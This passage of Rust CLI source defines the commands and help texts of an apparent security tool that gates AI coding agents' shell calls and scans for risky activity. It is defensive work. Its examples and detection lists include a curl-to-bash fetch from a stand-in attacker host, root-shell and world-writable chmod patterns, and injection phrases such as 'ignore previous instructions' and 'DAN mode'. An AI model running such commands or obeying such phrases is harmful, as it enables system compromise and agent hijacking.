`TIRITH_INTEGRATION`, MCP `clientInfo`, CI heuristics, and the gateway code
path. Every signal is **operator-trust** (caller-claimed); see
docs/agent-governance-design.md for the honest threat model.

`tirith agent sessions` lists recent audit log entries grouped by origin
with per-group counts, last-seen timestamps, and a (Allow / Warn / Block)
histogram. `tirith agent explain` drills into one session ID or partial
command. `tirith agent policy init` scaffolds an opt-in
`.tirith/agent-policy.yaml.example` from observed origins. `tirith agent
allow` validates and emits a matcher snippet for the policy.

**Enforcement is live.** Chunk 2 shipped the surface and the policy
schema; chunk 3 wired `agent_rules` into verdict gating via
`escalation::apply_agent_rules`. A non-bypass verdict whose
`agent_origin` matches a `deny` entry is now forced to Block (with a
`RuleId::AgentDeniedByPolicy` finding attached); a matching `allow` is
recorded but does NOT bypass an existing Block (`allow` is reserved for
richer matcher payloads in a future chunk). Test changes in a non-CI
shell before rolling out.

Examples:
  tirith agent sessions
  tirith agent sessions --format json
  tirith agent explain claude-code
  tirith agent policy init
  tirith agent allow --kind agent --tool claude-code")]
    Agent {
        #[command(subcommand)]
        action: AgentAction,
    },

    /// MCP gateway proxy — intercepts shell tool calls for security analysis
    #[command(after_help = "\
Examples:
  tirith gateway run --upstream-bin npx --upstream-arg @modelcontextprotocol/server-filesystem --config gateway.yaml
  tirith gateway validate-config --config gateway.yaml")]
    Gateway {
        #[command(subcommand)]
        action: GatewayAction,
    },

    /// Configure tirith protection for an AI coding tool
    #[command(after_help = "\
Examples:
  tirith setup claude-code --with-mcp
  tirith setup cursor
  tirith setup copilot-cli
  tirith setup kiro --scope user
  tirith setup claude-code --dry-run")]
    Setup {
        /// Tool to configure: claude-code, codex, copilot-cli, cursor, gemini-cli, kiro, openclaw, pi-cli, vscode, windsurf
        tool: String,

        /// Scope: project (default for most tools) or user
        #[arg(long)]
        scope: Option<String>,

        /// Also register tirith MCP server (Claude Code and Gemini CLI)
        #[arg(long)]
        with_mcp: bool,

        /// Append zshenv guard to ~/.zshenv (default: print snippet only)
        #[arg(long)]
        install_zshenv: bool,

        /// Show what would be written without writing
        #[arg(long)]
        dry_run: bool,

        /// Overwrite existing files and update stale entries
        #[arg(long)]
        force: bool,

        /// Refresh embedded hook scripts and gateway config to latest defaults.
        /// WARNING: overwrites local edits to generated hook scripts and gateway.yaml.
        /// Does not re-register MCP servers or modify shell profiles — use full setup for that.
        #[arg(long)]
        update_configs: bool,
    },

    /// Manage security policies
    #[command(after_help = "\
Examples:
  tirith policy init
  tirith policy validate
  tirith policy test 'curl https://example.com | bash'
  tirith policy tune --from-audit")]
    Policy {
        #[command(subcommand)]
        action: PolicyAction,
    },

    /// Test, validate, and explain custom detection rules (regex + when-DSL)
    #[command(after_help = "\
Custom rules live under `custom_rules:` in .tirith/policy.yaml. Each carries
EITHER a `pattern:` regex OR a `when:` semantic-predicate clause (the DSL).

`tirith rule validate` checks the custom RULES (pattern-XOR-when, predicate
shape, and that each rule's declared `context:` covers its predicates). For
whole-policy-FILE structure checks, use `tirith policy validate` instead.

Examples:
  tirith rule test --rule block-unknown-curl-to-shell --input 'curl https://evil.example/foo | bash'
  tirith rule validate
  tirith rule validate --path .tirith/policy.yaml
  tirith rule explain --rule block-unknown-curl-to-shell")]
    Rule {
        #[command(subcommand)]
        action: RuleAction,
    },

    /// Audit log management: export, stats, compliance reports, verify (Team)
    #[command(after_help = "\
Examples:
  tirith audit export
  tirith audit export --format csv --since 2025-01-01
  tirith audit stats --format json
  tirith audit report --format html > report.html
  tirith audit verify
  tirith audit verify --expected-head <sha256>")]
    Audit {
        #[command(subcommand)]
        action: AuditAction,
    },

    /// Activate a license key
    #[command(after_help = "\
Examples:
  tirith activate <license-key>")]
    Activate {
        /// The signed license token
        key: String,
    },

    /// Show or manage license status
    #[command(after_help = "\
Examples:
  tirith license
  tirith license --format json")]
    License {
        #[command(subcommand)]
        action: Option<LicenseAction>,
        /// Output format (default: human)
        #[arg(long, value_enum)]
        format: Option<HumanJsonFormat>,
        /// Alias for --format json
        #[arg(long, hide = true, conflicts_with = "format")]
        json: bool,
    },

    /// Log a hook telemetry event (called by hook scripts, always exits 0)
    #[command(hide = true)]
    HookEvent {
        /// Integration name (e.g., claude-code, cursor, vscode)
        #[arg(long)]
        integration: String,
        /// Hook type (e.g., pre_tool_use, before_shell_execution)
        #[arg(long)]
        hook_type: String,
        /// Event name (e.g., check_ok, check_block, warn_allowed, timeout)
        #[arg(long)]
        event: String,
        /// Hook-level timing in milliseconds
        #[arg(long)]
        elapsed_ms: Option<f64>,
        /// Freeform detail text
        #[arg(long)]
        detail: Option<String>,
    },

    /// Manage trusted patterns (allowlist entries with scope, TTL, and audit)
    #[command(after_help = "\
Trust is narrow and expiring by default: trust the most specific thing that
works, and entries expire after 30d unless you pass --permanent. A broad
pattern (whole domain, wildcard, bare TLD) requires --broad.

Examples:
  tirith trust add raw.githubusercontent.com/org/repo/main/get.sh
  tirith trust add example.com --broad --ttl 7d
  tirith trust add get.docker.com --broad --rule curl_pipe_shell --permanent
  tirith trust list --format json --expired
  tirith trust explain example.com
  tirith trust diff
  tirith trust gc --expired
  tirith trust remove example.com")]
    Trust {
        #[command(subcommand)]
        action: TrustAction,
    },

    /// Show accumulated session warnings
    #[command(after_help = "\
Examples:
  tirith warnings
  tirith warnings --format json
  tirith warnings --hidden")]
    Warnings {
        /// Clear session warnings after display
        #[arg(long)]
        clear: bool,

        /// Override session ID
        #[arg(long)]
        session: Option<String>,

        /// Output format (default: human)
        #[arg(long, value_enum)]
        format: Option<HumanJsonFormat>,
        /// Alias for --format json
        #[arg(long, hide = true, conflicts_with = "format")]
        json: bool,

        /// One-line summary (for shell exit hooks)
        #[arg(long, conflicts_with = "format", conflicts_with = "json")]
        summary: bool,

        /// Show findings hidden by paranoia filtering
        #[arg(long)]
        hidden: bool,
    },

    /// Score a package's provenance / maintainer risk
    #[command(after_help = "\
Scores a package the way `tirith score` scores a URL: a deterministic,
fully explainable sum of named factors — no model, no learned weights.

Offline by default: name signals come from the local threat database, and
content signals (install scripts, bundled binary blobs) only from a package
directory you already have on disk. `--online` additionally consults the
package's registry API (npm / PyPI / crates.io) for provenance signals;
`--offline` / TIRITH_OFFLINE forces offline even with `--online`.

Examples:
  tirith package risk npm react
  tirith package risk pypi reqeusts
  tirith package risk npm left-pad --path ./node_modules/left-pad
  tirith package risk --online npm express
  tirith package explain npm express
  tirith package explain --format json pypi requests")]
    Package {
        #[command(subcommand)]
        action: PackageAction,
    },

    /// Scan a project's dependency manifests for supply-chain risk
    #[command(after_help = "\
Walks a project directory, parses every dependency manifest it understands
(npm, Python, Rust, Go, Ruby), and scores every declared dependency with the
same deterministic engine as `tirith package risk` — plus a slopsquat
(AI-hallucinated package name) heuristic. Offline by default; --online adds
registry-API provenance signals. Findings are policy-aware and audit-logged.

Examples:
  tirith ecosystem scan
  tirith ecosystem scan ./my-project
  tirith ecosystem scan --online ./my-project
  tirith ecosystem scan --format json ./my-project")]
    Ecosystem {
        #[command(subcommand)]
        action: EcosystemAction,
    },

    /// Manage the threat intelligence database
    #[command(
        name = "threat-db",
        visible_alias = "threatdb",
        after_help = "\
Examples:
  tirith threat-db update
  tirith threat-db status --format json
  tirith threat-db explain react
  tirith threat-db sources
  tirith threat-db health
  tirith threat-db diff --since 2026-01-01"
    )]
    ThreatDb {
        #[command(subcommand)]
        action: ThreatDbAction,
    },

    /// Diagnose tirith installation and configuration
    #[command(after_help = "\
Examples:
  tirith doctor
  tirith doctor --fix
  tirith doctor --fix --yes
  tirith doctor --compat
  tirith doctor --simulate-enter")]
    Doctor {
        /// Output format (default: human)
        #[arg(long, value_enum)]
        format: Option<HumanJsonFormat>,
        /// Alias for --format json
        #[arg(
            long,
            hide = true,
            conflicts_with = "format",
            conflicts_with = "fix",
            conflicts_with = "reset_bash_safe_mode"
        )]
        json: bool,
        /// Remove persistent bash safe-mode flag (re-enables enter mode)
        #[arg(long, conflicts_with = "format")]
        reset_bash_safe_mode: bool,
        /// Auto-fix detected issues
        #[arg(long, conflicts_with = "format")]
        fix: bool,
        /// Auto-approve all fixes (no prompting)
        #[arg(long, requires = "fix")]
        yes: bool,
        /// Run the bash enter-mode delivery self-test and cache the result
        #[arg(
            long,
            conflicts_with = "format",
            conflicts_with = "json",
            conflicts_with = "fix",
            conflicts_with = "reset_bash_safe_mode"
        )]
        simulate_enter: bool,
        /// Print a focused shell/terminal compatibility report (supports
        /// --format json). Mutually exclusive with --fix, --simulate-enter,
        /// and --reset-bash-safe-mode.
        #[arg(
            long,
            conflicts_with = "fix",
            conflicts_with = "simulate_enter",
            conflicts_with = "reset_bash_safe_mode"
        )]
        compat: bool,

        /// Write a redacted diagnostic bundle to a file and print its path.
        /// The bundle (doctor info, tirith + hook versions, shell/mode/effective
        /// protection, hook-chain state, policy discovery, threat-DB status, and
        /// relevant environment) is safe to attach to a bug report: secrets,
        /// tokens, and the literal home-directory path are redacted. Accepts the
        /// aliases --redacted-report and --shell-trace. Mutually exclusive with
        /// --fix, --simulate-enter, --reset-bash-safe-mode, and --compat.
        #[arg(
            long,
            visible_alias = "redacted-report",
            visible_alias = "shell-trace",
            conflicts_with = "fix",
            conflicts_with = "simulate_enter",
            conflicts_with = "reset_bash_safe_mode",
            conflicts_with = "compat"
        )]
        bundle: bool,

        /// Fast status only (protection_mode, policy_path_used, hook_configured);
        /// skips DB/log/baseline probes. Read-only and safe to poll (the VS
        /// Code extension polls `--quick --format json` ~every 30s). Compatible
        /// with --format json / --json; mutually exclusive with the mutating
        /// flags (--fix, --reset-bash-safe-mode) and the other report modes.
        #[arg(
            long,
            conflicts_with = "fix",
            conflicts_with = "reset_bash_safe_mode",
            conflicts_with = "simulate_enter",
            conflicts_with = "compat",
            conflicts_with = "bundle"
        )]
        quick: bool,
    },

    /// Generate shell completions
    #[command(hide = true)]
    Completions {
        /// Shell to generate completions for
        #[arg(value_enum)]
        shell: clap_complete::Shell,
    },

    /// Run tirith as an LSP server over stdio (for IDE extensions)
    #[command(after_help = "\
Runs a Language Server Protocol server over stdin/stdout so an editor extension
can surface tirith diagnostics inline as you edit. The server analyzes each
opened/changed document according to its file type (AI-config files like
CLAUDE.md, install-doc markdown, source code, and .log files) and publishes
diagnostics for the suspicious URLs, hidden instructions, trojan-source
homoglyphs, and credentials it finds. It reads only the editor's in-memory text
and never reaches the network.

This command speaks the LSP wire protocol on stdio; run it from an editor's LSP
client, not interactively.")]
    Lsp,

    /// Generate man page
    #[command(hide = true)]
    Manpage,

    /// Verify the running tirith binary's integrity and provenance
    #[command(after_help = "\
Verifies that the tirith binary you are running is the genuine, unmodified
binary from an official release. It re-downloads the release archive for this
exact version, checks it against the signed release checksums.txt (and the
cosign signature when cosign is installed), and confirms the running binary is
byte-identical to the official one.

If full verification is not possible — a local dev build, no network, an
unknown install — it says so HONESTLY rather than reporting a false 'verified'.

This command reaches the network; it does so only when you run it.

Examples:
  tirith verify-self
  tirith verify-self --format json")]
    VerifySelf {
        /// Output format (default: human)
        #[arg(long, value_enum)]
        format: Option<HumanJsonFormat>,
        /// Alias for --format json
        #[arg(long, hide = true, conflicts_with = "format")]
        json: bool,
    },

    /// Update tirith to the latest release (package-manager aware)
    #[command(after_help = "\
Updates tirith to the latest release. tirith detects how it was installed:

  * Package-manager installs (Homebrew, cargo, npm, Scoop, AUR, apt/dnf) are
    NEVER self-modified — tirith prints the exact command to run instead.
  * A self-managed install (the install.sh tarball or a standalone binary) is
    updated in place: tirith downloads the release, verifies its cosign
    signature, then performs an atomic swap, keeping the previous binary so
    --rollback can revert.

By default the release's cosign signature is REQUIRED: if it cannot be verified
(cosign missing, or the release published no signature) the update aborts. Pass
--allow-unsigned to fall back to checksum-only verification (a checksum mismatch
still always aborts).

This command reaches the network; it does so only when you run it.

Examples:
  tirith update
  tirith update --allow-unsigned
  tirith update --rollback
  tirith update --dry-run")]
    Update {
        /// Allow a checksum-only update when the cosign signature cannot be
        /// verified (cosign missing, or no signature published). By default the
        /// signature is mandatory and the update aborts without it. A checksum
        /// mismatch always aborts regardless of this flag.
        #[arg(long)]
        allow_unsigned: bool,

        /// Revert to the previously-installed binary (self-managed installs
        /// only). Conflicts with --allow-unsigned.
        #[arg(long, conflicts_with = "allow_unsigned")]
        rollback: bool,

        /// Show what would happen without changing anything.
        #[arg(long)]
        dry_run: bool,

        /// Skip the confirmation prompt.
        #[arg(long)]
        yes: bool,

        /// Output format (default: human)
        #[arg(long, value_enum)]
        format: Option<HumanJsonFormat>,
        /// Alias for --format json
        #[arg(long, hide = true, conflicts_with = "format")]
        json: bool,
    },

    /// Show the running binary's version and provenance
    #[command(after_help = "\
Examples:
  tirith version
  tirith version --provenance
  tirith version --provenance --format json")]
    Version {
        /// Show full provenance: build info, detected install method, and the
        /// (offline) verification status. Run `tirith verify-self` for full
        /// networked verification.
        #[arg(long)]
        provenance: bool,

        /// Output format (default: human)
        #[arg(long, value_enum)]
        format: Option<HumanJsonFormat>,
        /// Alias for --format json
        #[arg(long, hide = true, conflicts_with = "format")]
        json: bool,
    },

    /// Render a file with terminal-deception sequences neutralized
    #[command(after_help = "\
Streams the file in 64 KiB chunks, neutralizes ANSI / OSC / DCS escape
sequences and zero-width characters in the displayed output, and flags
output-direction deception attacks (OSC 52 clipboard write, OSC 8 hyperlink
mismatch, hidden text via fg==bg SGR, fake-prompt injection, screen-clear,
title rewrite).

The default scan cap is 16 MiB. Use --max-bytes to scan larger files (and
accept the per-byte work that entails).

Examples:
  tirith view /var/log/system.log
  tirith view --json --max-bytes 33554432 /tmp/build.log
  cat /tmp/file | tirith view -")]
    View {
        /// File to view. Use `-` (or omit) to read stdin.
        path: Option<String>,

        /// Maximum bytes to scan. Default 16 MiB.
        #[arg(long, default_value_t = cli::view::DEFAULT_MAX_BYTES)]
        max_bytes: u64,

        /// Output the verdict as JSON instead of human-readable text.
        #[arg(long)]
        json: bool,
    },

    /// Manage opt-in output-direction protections
    #[command(after_help = "\
Subcommands:
  tirith output wrap on | off | status   — install/remove the `tirith-out`
                                           shell wrapper that pipes a single
                                           command's stdout/stderr through
                                           `tirith view`.

Honesty: the wrapper applies to INDIVIDUAL commands invoked via
`tirith-out <cmd>`. It does NOT intercept output from anything run outside
the wrapper.

Examples:
  tirith output wrap on | off | status")]
    Output {
        #[command(subcommand)]
        action: OutputAction,
    },

    /// Redact a file before sharing it externally (M7 ch2)
    #[command(after_help = "\
Audience presets control what gets stripped IN ADDITION to credentials
(which are always stripped):

  github-issue  — strips credentials + internal hostnames
                  (`*.corp`, `*.internal`, `*.local`, `*.lan`).
                  Preserves repo paths, stack traces, line numbers.
  slack         — same as github-issue.
  llm           — strips credentials only. Preserves stack traces, line
                  numbers, repo paths, /home/<user>. An LLM benefits
                  from this context for debugging.
  public-paste  — MOST aggressive: also strips /home/<user>,
                  /Users/<user>, and RFC1918 private IPs that appear in
                  hostname context (e.g. `server 10.0.0.5`). Public DNS
                  like 1.1.1.1 is left alone.
  generic       — same as llm. Safe default when no audience is known.

The redacted content goes to stdout (or --out <path> if given). A
per-label summary of how many items were removed prints to stderr. With
--json, the envelope is `{ redacted_content, redactions: [...] }`.

Customer / tenant / case IDs are repo-specific and NOT shipped as
built-ins; configure them via `policy.share.customer_id_patterns`.

Examples:
  tirith share --target llm ./fixture.log
  tirith share --target public-paste --out /tmp/safe.log ./fixture.log
  tirith share --target github-issue --json ./fixture.log")]
    Share {
        /// File to redact. Use `-` (or omit) to read stdin.
        path: Option<String>,

        /// Audience preset: github-issue | slack | llm | public-paste | generic.
        #[arg(long, value_parser = clap::builder::PossibleValuesParser::new(tirith_core::redact::ShareAudience::cli_values()))]
        target: String,

        /// Write redacted content to this file instead of stdout. Use `-`
        /// for stdout (the default).
        #[arg(long)]
        out: Option<String>,

        /// Output a `{ redacted_content, redactions: [...] }` JSON envelope.
        #[arg(long)]
        json: bool,
    },

    /// Read stdin, write redacted content to stdout (M7 ch2)
    #[command(after_help = "\
Streams stdin → stdout, applying the same audience-aware redaction engine
as `tirith share`. Useful for pipelines:

  cat error.log | tirith redact --audience slack | pbcopy
  kubectl logs my-pod | tirith redact --audience public-paste > safe.log

See `tirith share --help` for what each audience strips.

Examples:
  cat ./fixture.log | tirith redact --audience slack
  cat ./fixture.log | tirith redact --audience public-paste --json")]
    Redact {
        /// Audience preset: github-issue | slack | llm | public-paste | generic.
        #[arg(long, value_parser = clap::builder::PossibleValuesParser::new(tirith_core::redact::ShareAudience::cli_values()))]
        audience: String,

        /// Output a `{ redacted_content, redactions: [...] }` JSON envelope.
        #[arg(long)]
        json: bool,
    },

    /// Read/write/scan the system clipboard with secret-shape gating (M7 ch3)
    #[command(after_help = "\
Subcommands:
  tirith clipboard copy <file>                 — copy file contents to
                                                  the clipboard; refuses when
                                                  the file contains secret-
                                                  shaped data. Use --redact
                                                  --audience <a> to copy a
                                                  sanitized version instead.
  tirith clipboard scan                        — read the current clipboard
                                                  and print a paste verdict.
  tirith clipboard guard install-service       — print (and on --apply write)
                                                  the OS-correct service
                                                  unit that drives the
                                                  background polling daemon.
                                                  macOS: launchd plist.
                                                  Linux: systemd --user unit.
                                                  Windows: not supported in
                                                  service mode.
  tirith clipboard guard uninstall-service     — remove the unit.
  tirith clipboard guard status                — report whether the service
                                                  is installed + loaded.
  tirith clipboard watch                       — poll the clipboard and report
                                                  the browser source of each new
                                                  copy (needs the companion
                                                  extension; M12).

Why a service unit, not a shell-profile `&` background:
  Spawning the daemon from ~/.zshrc via `&` orphans processes on
  subshells, double-runs on window reload, and gives `uninstall` no
  clean-shutdown handle. We ship the launchd / systemd path only.
  Operators who still want the manual escape hatch can run
  `tirith clipboard daemon --foreground &` themselves.

Headless behavior:
  Linux without X/Wayland (CI, SSH) → no clipboard backend → soft
  degrade with a documented `no_backend` envelope. Exit code stays 0
  under --json so CI hygiene runs don't trip.

Examples:
  tirith clipboard copy ./snippet.sh
  tirith clipboard copy --redact --audience public-paste ./fixture.log
  tirith clipboard scan --json
  tirith clipboard guard install-service
  tirith clipboard guard install-service --apply
  tirith clipboard guard uninstall-service
  tirith clipboard guard status
  tirith clipboard watch
  tirith clipboard watch --json")]
    Clipboard {
        #[command(subcommand)]
        action: ClipboardAction,
    },

    /// Scan / summarize / redact log files for agent-safety review (M7 ch5)
    #[command(after_help = "\
Subcommands:
  tirith logs scan       — run the file-scan + credential engine over a log
                           file. Flags prompt-injection seeds, secrets,
                           ANSI/zero-width terminal-deception bytes. Exits 1
                           on any finding.
  tirith logs summarize  — produce a compressed view of a log file. With
                           `--safe-for-agent`, also redacts secrets /
                           internal hostnames / customer IDs and strips
                           ANSI escape sequences. Truncates to
                           `--max-lines` (default 200) keeping head+tail.
  tirith logs redact     — share-engine wrapper for log content. Same
                           audience-aware DLP shape as `tirith share`.

Honesty on prompt injection:
  `scan` uses the M7 ch5 prompt-injection seed catalog — well-known
  phrases like \"ignore previous instructions\", \"act as <role>\",
  \"system:\", \"DAN mode\". This catches the EASY cases and is NOT a
  complete defense. Sophisticated injections (encoded payloads,
  paraphrases, cross-language) will slip past. Treat every line of
  agent output as untrusted regardless of whether the rule fired.

Streaming:
  `summarize` and `redact` stream line-by-line and have no input size
  cap. `scan` reads up to 64 MiB (above that, use `summarize` first).

Examples:
  tirith logs scan ./error.log
  tirith logs scan --json ./agent-trace.log
  tirith logs summarize ./build.log
  tirith logs summarize --safe-for-agent --max-lines 100 ./build.log
  tirith logs redact --audience llm ./error.log
  tirith logs redact --audience public-paste --json ./error.log")]
    Logs {
        #[command(subcommand)]
        action: LogsAction,
    },

    /// Inspect / guard / label your active cloud + k8s contexts (M8 ch1)
    #[command(after_help = "\
Subcommands:
  tirith context status                         — list the currently-active
                                                  kube / aws / gcp / azure
                                                  contexts and their labels.
  tirith context guard on | off | status        — flip the context-guard rule
                                                  on or off in your local
                                                  policy.yaml (single boolean
                                                  key — never round-trips the
                                                  whole policy file).
  tirith context label <provider:context>       — label a provider:context
        <criticality> [--scope user|repo]         entry (e.g.
                                                  `kube:prod-us-east critical`).
                                                  --scope user writes to
                                                  ~/.config/tirith/context-labels.yaml,
                                                  --scope repo writes to
                                                  <repo>/.tirith/context-labels.yaml.

Labels live in a DEDICATED labels file, NOT policy.yaml:
  The labels file is a flat YAML map. We never modify policy.yaml when
  writing labels — operators hand-edit that file with comments and a
  specific key order; round-tripping it would lose those.

Honest scope:
  Labels are operator-trust, not adversary-resistant. The labels file is
  user-writable; anyone with shell access can re-label a context. tirith
  context is for catching operational footguns (`kubectl delete namespace
  payments` on the wrong cluster), not for stopping someone who already
  has root.

Examples:
  tirith context status
  tirith context status --json
  tirith context guard on
  tirith context guard status
  tirith context label kube:prod-us-east critical --scope user
  tirith context label aws:prod production --scope repo")]
    Context {
        #[command(subcommand)]
        action: ContextAction,
    },

    /// Guard / inspect IaC apply gates for Terraform / Pulumi / OpenTofu (M8 ch3)
    #[command(after_help = "\
Subcommands:
  tirith iac guard on | off | status                  — flip the shared
                                                        operational-context
                                                        switch (same flag
                                                        as `tirith context
                                                        guard`).
  tirith iac check-plan <tfplan>                      — parse the saved plan,
        [--tool terraform|pulumi|tofu]                  record its SHA-256 in
                                                        the per-process plan
                                                        store, and report
                                                        create / update /
                                                        destroy counts +
                                                        IAM / SG / public-bucket
                                                        flags.
  tirith iac require-plan-before-apply                — toggle the
        on | off | status                               plan-before-apply gate.
                                                        When ON,
                                                        `terraform apply`
                                                        without a saved plan
                                                        is High; mismatched
                                                        plan hashes block too.

What it catches:
  `terraform apply -auto-approve` (or `pulumi up --yes`, `tofu apply
  -auto-approve`) — Medium outside production, High inside production
  (resolved through `tirith context status`).

  `terraform destroy` against a labeled-prod context — High.

  `terraform apply tfplan` where the file hash does NOT match a
  `tirith iac check-plan`-recorded entry, when
  `iac_require_plan_before_apply` is on — High.

Plan source:
  `tirith iac check-plan` shells out to `terraform show -json <plan>` /
  `tofu show -json <plan>` with a 5s timeout (plans can be large).
  Pulumi plans are read directly because `pulumi preview --json` is
  already JSON. The shell-out NEVER happens on the engine hot path;
  only `tirith iac check-plan` invokes it.

Plan cache:
  Records go under `state_dir()/iac_plans/<sha256>.json`. Plans older
  than 7 days are dropped on each `check-plan` invocation.

Examples:
  tirith iac guard on
  tirith iac guard status
  tirith iac require-plan-before-apply on
  tirith iac require-plan-before-apply status
  tirith iac check-plan tfplan
  tirith iac check-plan --tool pulumi ./plan.json")]
    Iac {
        #[command(subcommand)]
        action: IacAction,
    },

    /// Inspect / guard / label SSH hosts for remote-session protection (M8 ch2)
    #[command(after_help = "\
Subcommands:
  tirith ssh guard on | off | status        — flip the operational-context
                                              rule (shared switch with
                                              `tirith context guard`).
  tirith ssh label <host> <criticality>     — label a host (or user@host)
        [--scope user|repo]                   with a criticality string.
                                              `~/.ssh/config` aliases are
                                              resolved at label time via
                                              `ssh -G <host>`; the labels
                                              file always stores the final
                                              hostname.

Labels live in a DEDICATED labels file, NOT policy.yaml:
  --scope user → ~/.config/tirith/ssh-host-labels.yaml
  --scope repo → <repo>/.tirith/ssh-host-labels.yaml

What it catches:
  `ssh prod-host '<destructive>'` — when the target host is labeled
  critical / production, destructive inner commands (sudo systemctl
  stop, rm -rf, dd, useradd, kubectl delete, ...) fire a High finding.
  Bare `ssh prod-host` emits an Info reminder that tirith protects the
  LOCAL shell only — post-handshake commands are not intercepted.

`tirith ssh bootstrap <user@host>` (auto-install hook on the remote
side) is DEFERRED to M8.1 — running it today exits 2 with a pointer.

Honest scope:
  Labels are operator-trust, not adversary-resistant. The labels file
  is user-writable; anyone with shell access can re-label a host.
  tirith ssh is for catching operational footguns, not for stopping
  someone who already has root.

Examples:
  tirith ssh guard on
  tirith ssh guard status
  tirith ssh label payments-prod-01 critical --scope user
  tirith ssh label root@payments-prod-01 critical --scope repo")]
    Ssh {
        #[command(subcommand)]
        action: SshAction,
    },

    /// Guard / inspect sudo-escalation gates (M8 ch4)
    #[command(after_help = "\
Subcommands:
  tirith sudo guard on | off | status              — flip the shared
                                                     operational-context
                                                     switch (same flag
                                                     as `tirith context
                                                     guard`).
  tirith sudo session start [--ttl 30m]            — open a tagged sudo
        [--reason \"…\"]                            session window. When
                                                     `sudo_require_reason`
                                                     is on, an active
                                                     session downgrades
                                                     the M8 ch4 sudo rules
                                                     from High to Medium.
  tirith sudo session end                          — clear the session.
  tirith sudo session status                       — report active or
                                                     inactive + remaining
                                                     TTL.
  tirith sudo require-reason on | off | status     — toggle the
                                                     `sudo_require_reason`
                                                     gate.

What it catches:
  `sudo sh | bash | zsh | fish` — interactive root shell, High.
  `sudo -E …` with sensitive env (AWS_*, GITHUB_TOKEN, …) set — High.
  `… | sudo tee /etc/cron.d/x` (or /usr/local/bin/, /lib/systemd/) — High.
  `sudo curl -o /usr/local/bin/<tool> <url>` — High.
  `sudo chmod -R 777 /home` (or /, /usr, /etc) — High.

Session file:
  Stored under `state_dir()/sudo-session.json` with `{started_at, ttl_secs,
  reason}`. The TTL check tolerates ±60s clock skew (NTP drift, container
  time-warp). The file is user-writable — labels are operator-trust, not
  adversary-resistant.

Examples:
  tirith sudo guard on
  tirith sudo guard status
  tirith sudo session start --ttl 30m --reason \"rotating cert\"
  tirith sudo session status
  tirith sudo session end
  tirith sudo require-reason on")]
    Sudo {
        #[command(subcommand)]
        action: SudoAction,
    },

    /// Guard / wire devcontainer.json with the tirith init hook (M8 ch5)
    #[command(after_help = "\
Subcommands:
  tirith devcontainer guard on | off | status     — flip the shared
                                                    operational-context
                                                    switch (same flag
                                                    as `tirith context
                                                    guard`).
  tirith devcontainer inject                      — locate
        [--path <dir>] [--create]                   `.devcontainer/devcontainer.json`
                                                    under <dir> (or cwd) and
                                                    add a tirith
                                                    `postCreateCommand` line
                                                    + TIRITH_DEVCONTAINER=1.
                                                    Idempotent.

What it catches:
  At command time:
    docker run --privileged alpine                  — High.
    docker run -v /var/run/docker.sock:… alpine     — High.
    docker run -v ~/.ssh:/root/.ssh alpine          — High.
    docker exec <prod-labeled> /bin/sh              — Medium (requires
                                                       `context_labels`
                                                       entry keyed by
                                                       `container:<name>`).
  At file scan:
    `runArgs: [\"--privileged\"]` in devcontainer.json — High.
    `mounts: [\"source=…ssh…\"]` in devcontainer.json — High.

Devcontainer.json is JSONC: comments and trailing commas are accepted.
tirith strips them before parsing and re-emits a clean JSON file on
inject; existing fields tirith does NOT modify are preserved.

Examples:
  tirith devcontainer guard on
  tirith devcontainer guard status
  tirith devcontainer inject
  tirith devcontainer inject --path /workspaces/myrepo
  tirith devcontainer inject --create")]
    Devcontainer {
        #[command(subcommand)]
        action: DevcontainerAction,
    },

    /// GitHub Codespaces helpers (M8 ch5) — separate namespace from devcontainer
    #[command(after_help = "\
Subcommands:
  tirith codespaces setup                         — write
        [--path <dir>]                              `.devcontainer/devcontainer.json`
                                                    (if absent) with the
                                                    tirith hook +
                                                    TIRITH_DEVCONTAINER=1,
                                                    and append `.tirith/`
                                                    to .gitignore.
  tirith codespaces inject                        — alias of
        [--path <dir>] [--create]                   `tirith devcontainer
                                                    inject` for operators
                                                    who think in
                                                    Codespaces terms.

Setup is idempotent — re-running on an already-wired repo is a no-op.

Examples:
  tirith codespaces setup
  tirith codespaces setup --path /workspaces/myrepo
  tirith codespaces inject --create")]
    Codespaces {
        #[command(subcommand)]
        action: CodespacesAction,
    },

    /// Audit local credential-file / permission hygiene (M9 ch1)
    #[command(after_help = "\
Subcommands:
  tirith hygiene scan                             — walk ~/.ssh, ~/.aws,
        [--json]                                    ~/.kube/config, ~/.npmrc,
                                                    ~/.pypirc, ~/.gitconfig,
                                                    shell histories, and the
                                                    repo root; report
                                                    hygiene issues. Exit 1 if
                                                    any High/Critical finding.
  tirith hygiene fix                              — apply chmod-only fixes.
        [--dry-run] [--yes] [--json]                Per-finding confirmation
                                                    unless --yes. NEVER moves,
                                                    edits, or deletes files.

What it catches:
  ~/.ssh/id_* not 0600                            — High (auto-fix: chmod).
  ~/.aws/credentials loose perms                  — High (auto-fix: chmod).
  repo .env world-readable                        — High (auto-fix: chmod).
  ~/.kube/config group-readable                   — Medium (auto-fix: chmod).
  ~/.npmrc / ~/.pypirc plaintext token            — High (manual fix).
  ~/.ssh/config unsafe Include                    — Medium (manual fix).
  ~/.gitconfig credential.helper = store          — Medium (manual fix).
  shell history with credential-shaped text       — Medium (manual fix).
  *.dump / *.sql in the repo                       — Medium (manual fix).

`fix` is chmod-only by design: the only automated remediation is
`chmod 0600` on a loose-permission file. Token / location / config
problems are reported with guidance but never auto-applied — tirith
never moves, edits, or deletes your files.

Examples:
  tirith hygiene scan
  tirith hygiene scan --json
  tirith hygiene fix --dry-run
  tirith hygiene fix --yes")]
    Hygiene {
        #[command(subcommand)]
        action: HygieneAction,
    },

    /// Inventory + monitor persistence mechanisms for changes (M9 ch2)
    #[command(after_help = "\
Subcommands:
  tirith persistence scan                         — inventory every watched
        [--json]                                    persistence surface, print
                                                    each location + sha256, and
                                                    record the baseline snapshot.
  tirith persistence diff                         — show what changed since the
        [--json]                                    baseline: ADDED LINES ONLY,
                                                    credential-redacted. Exit 1
                                                    if any High finding.
  tirith persistence watch                        — poll every --interval secs
        [--interval <secs>] [--json]                (default 30) until Ctrl-C,
                                                    reporting incremental changes.

What it watches:
  shell rc/profile files (~/.bashrc, ~/.zshrc, ~/.profile, fish/PowerShell
  profiles), ~/.ssh/authorized_keys, ~/.ssh/config, ~/.gitconfig, ~/.npmrc,
  the user crontab (crontab -l), ~/.config/systemd/user/*.service, macOS
  ~/Library/LaunchAgents/*.plist, login items, .envrc in the cwd ancestry,
  and the git global hooks path (core.hooksPath).

What changes fire (on diff/watch):
  authorized_keys new entry                       — High.
  launch agent / systemd-user unit added          — High.
  shell rc/profile modified                       — Medium.
  crontab modified                                — Medium.
